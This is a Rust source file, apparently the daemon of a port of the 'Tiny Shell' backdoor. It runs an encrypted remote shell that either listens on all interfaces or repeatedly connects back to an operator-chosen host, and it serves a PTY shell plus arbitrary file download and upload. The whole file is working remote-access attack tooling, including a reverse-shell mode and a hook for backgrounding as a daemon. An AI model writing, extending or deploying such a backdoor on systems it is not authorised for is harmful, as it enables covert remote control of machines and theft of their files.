use clap::{Arg, Command};
use log::{error, info, warn};
use std::process;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::signal;
use tokio::time::{sleep, Duration};

// Import our library modules
use tsh_rs::{
    constants::*,
    error::*,
    pel::{PktEncLayer, PktEncLayerListener},
    pty::Pty,
};

#[tokio::main]
async fn main() -> TshResult<()> {
    env_logger::init();

    let matches = Command::new("tshd")
        .version("0.1.0")
        .author("Your Name <your.email@example.com>")
        .about("Tiny Shell - Remote shell daemon")
        .arg(
            Arg::new("secret")
                .short('s')
                .long("secret")
                .value_name("SECRET")
                .help("Authentication secret")
                .default_value(DEFAULT_SECRET),
        )
        .arg(
            Arg::new("port")
                .short('p')
                .long("port")
                .value_name("PORT")
                .help("Port number")
                .default_value("1234"),
        )
        .arg(
            Arg::new("connect-back")
                .short('c')
                .long("connect-back")
                .value_name("HOST")
                .help("Connect back to host (client mode)"),
        )
        .arg(
            Arg::new("delay")
                .short('d')
                .long("delay")
                .value_name("SECONDS")
                .help("Connect back delay in seconds")
                .default_value("5"),
        )
        .arg(
            Arg::new("daemon")
                .long("daemon")
                .help("Run as daemon (internal use)")
                .action(clap::ArgAction::SetTrue),
        )
        .get_matches();

    let secret = matches.get_one::<String>("secret").unwrap().clone();
    let port: u16 = matches
        .get_one::<String>("port")
        .unwrap()
        .parse()
        .map_err(|_| TshError::system("Invalid port number"))?;

    let connect_back_host = matches
        .get_one::<String>("connect-back")
        .map(|s| s.as_str());
    let delay: u64 = matches
        .get_one::<String>("delay")
        .unwrap()
        .parse()
        .map_err(|_| TshError::system("Invalid delay value"))?;

    let is_daemon = matches.get_flag("daemon");

    // If not daemon mode, fork into background
    if !is_daemon {
        run_in_background().await?;
        return Ok(());
    }

    // Setup signal handling
    setup_signal_handlers().await;

    if let Some(host) = connect_back_host {
        // Connect-back mode
        run_connect_back_mode(host, port, secret, delay).await
    } else {
        // Listen mode
        run_listen_mode(port, secret).await
    }
}

async fn run_in_background() -> TshResult<()> {
    info!("Starting daemon in background");

    // In a real implementation, you would fork the process here
    // For this example, we'll just continue running
    warn!("Background forking not implemented in this example");

    Ok(())
}

async fn setup_signal_handlers() {
    tokio::spawn(async {
        let mut sigterm = signal::unix::signal(signal::unix::SignalKind::terminate())
            .expect("Failed to register SIGTERM handler");
        let mut sigint = signal::unix::signal(signal::unix::SignalKind::interrupt())
            .expect("Failed to register SIGINT handler");

        tokio::select! {
            _ = sigterm.recv() => {
                info!("Received SIGTERM, shutting down");
                process::exit(0);
            }
            _ = sigint.recv() => {
                info!("Received SIGINT, shutting down");
                process::exit(0);
            }
        }
    });
}

async fn run_listen_mode(port: u16, secret: String) -> TshResult<()> {
    let address = format!("0.0.0.0:{}", port);
    info!("Starting server on {}", address);

    let listener = PktEncLayerListener::new(&address, secret, true).await?;

    info!("Server listening on {}", listener.local_addr()?);

    loop {
        match listener.accept().await {
            Ok(connection) => {
                info!("New connection accepted");
                tokio::spawn(async move {
                    if let Err(e) = handle_connection(connection).await {
                        error!("Connection error: {}", e);
                    }
                });
            }
            Err(e) => {
                error!("Failed to accept connection: {}", e);
                sleep(Duration::from_secs(1)).await;
            }
        }
    }
}

async fn run_connect_back_mode(host: &str, port: u16, secret: String, delay: u64) -> TshResult<()> {
    let address = format!("{}:{}", host, port);
    info!(
        "Connect-back mode: connecting to {} every {} seconds",
        address, delay
    );

    loop {
        match PktEncLayer::connect(&address, secret.clone(), true).await {
            Ok(connection) => {
                info!("Connected to {}", address);
                if let Err(e) = handle_connection(connection).await {
                    error!("Connection error: {}", e);
                }
            }
            Err(e) => {
                warn!("Failed to connect to {}: {}", address, e);
            }
        }

        sleep(Duration::from_secs(delay)).await;
    }
}

async fn handle_connection(mut layer: PktEncLayer) -> TshResult<()> {
    info!("Handling new connection");

    // Read operation mode
    let mut mode_buf = [0u8; 1];
    layer.read(&mut mode_buf).await?;
    let mode = OperationMode::from(mode_buf[0]);

    info!("Operation mode: {:?}", mode);

    match mode {
        OperationMode::RunShell => handle_shell(&mut layer).await,
        OperationMode::GetFile => handle_file_download(&mut layer).await,
        OperationMode::PutFile => handle_file_upload(&mut layer).await,
    }
}

async fn handle_shell(layer: &mut PktEncLayer) -> TshResult<()> {
    info!("Starting shell session");

    let mut pty = Pty::new()?;
    let mut client_buffer = vec![0u8; BUFSIZE];
    let mut pty_buffer = vec![0u8; BUFSIZE];

    loop {
        tokio::select! {
            // Read from client and write to PTY
            result = layer.read(&mut client_buffer) => {
                match result {
                    Ok(n) => {
                        if n == 0 {
                            break;
                        }
                        if let Err(e) = pty.write(&client_buffer[..n]).await {
                            error!("Failed to write to PTY: {}", e);
                            break;
                        }
                    }
                    Err(TshError::ConnectionClosed) => {
                        info!("Client disconnected");
                        break;
                    }
                    Err(e) => {
                        error!("Error reading from client: {}", e);
                        break;
                    }
                }
            }

            // Read from PTY and write to client
            result = pty.read(&mut pty_buffer) => {
                match result {
                    Ok(n) => {
                        if n == 0 {
                            break;
                        }
                        if let Err(e) = layer.write(&pty_buffer[..n]).await {
                            error!("Failed to write to client: {}", e);
                            break;
                        }
                    }
                    Err(e) => {
                        error!("Error reading from PTY: {}", e);
                        break;
                    }
                }
            }
        }
    }

    info!("Shell session ended");
    Ok(())
}

async fn handle_file_download(layer: &mut PktEncLayer) -> TshResult<()> {
    info!("Handling file download");

    // Read filename
    let mut filename_buf = vec![0u8; 1024];
    let mut filename = String::new();

    loop {
        let n = layer.read(&mut filename_buf).await?;
        if n == 0 {
            break;
        }

        let chunk = String::from_utf8_lossy(&filename_buf[..n]);
        if let Some(null_pos) = chunk.find('\0') {
            filename.push_str(&chunk[..null_pos]);
            break;
        }
        filename.push_str(&chunk);
    }

    info!("Downloading file: {}", filename);

    // Open file for reading
    use tokio::fs::File;
    let mut file = match File::open(&filename).await {
        Ok(f) => f,
        Err(e) => {
            error!("Failed to open file {}: {}", filename, e);
            // Send error status
            layer.write(&[0u8; 8]).await?; // 0 size indicates error
            return Ok(());
        }
    };

    // Get file size and send it
    let file_size = file.metadata().await?.len();
    layer.write(&file_size.to_le_bytes()).await?;

    // Send file content
    let mut buffer = vec![0u8; BUFSIZE];
    let mut total_sent = 0u64;

    while total_sent < file_size {
        let n = file.read(&mut buffer).await?;
        if n == 0 {
            break;
        }

        layer.write(&buffer[..n]).await?;
        total_sent += n as u64;
    }

    info!("File download completed: {} bytes", total_sent);
    Ok(())
}

async fn handle_file_upload(layer: &mut PktEncLayer) -> TshResult<()> {
    info!("Handling file upload");

    // Read destination directory
    let mut dest_buf = vec![0u8; 1024];
    let mut dest_dir = String::new();

    loop {
        let n = layer.read(&mut dest_buf).await?;
        if n == 0 {
            break;
        }

        let chunk = String::from_utf8_lossy(&dest_buf[..n]);
        if let Some(null_pos) = chunk.find('\0') {
            dest_dir.push_str(&chunk[..null_pos]);
            break;
        }
        dest_dir.push_str(&chunk);
    }

    // Read file size
    let mut size_buf = [0u8; 8];
    layer.read(&mut size_buf).await?;
    let file_size = u64::from_le_bytes(size_buf);

    info!("Uploading file to {}, size: {} bytes", dest_dir, file_size);

    // Create destination file
    use std::path::Path;
    use tokio::fs::File;

    let dest_path = Path::new(&dest_dir).join("uploaded_file");
    let mut file = File::create(&dest_path).await.map_err(|e| {
        TshError::file_transfer(format!("Failed to create destination file: {}", e))
    })?;

    // Receive file content
    let mut buffer = vec![0u8; BUFSIZE];
    let mut total_received = 0u64;

    while total_received < file_size {
        let to_read = std::cmp::min(buffer.len(), (file_size - total_received) as usize);
        let n = layer.read(&mut buffer[..to_read]).await?;

        if n == 0 {
            break;
        }

        file.write_all(&buffer[..n])
            .await
            .map_err(|e| TshError::file_transfer(format!("Failed to write to file: {}", e)))?;

        total_received += n as u64;
    }

    info!("File upload completed: {} bytes", total_received);
    Ok(())
}
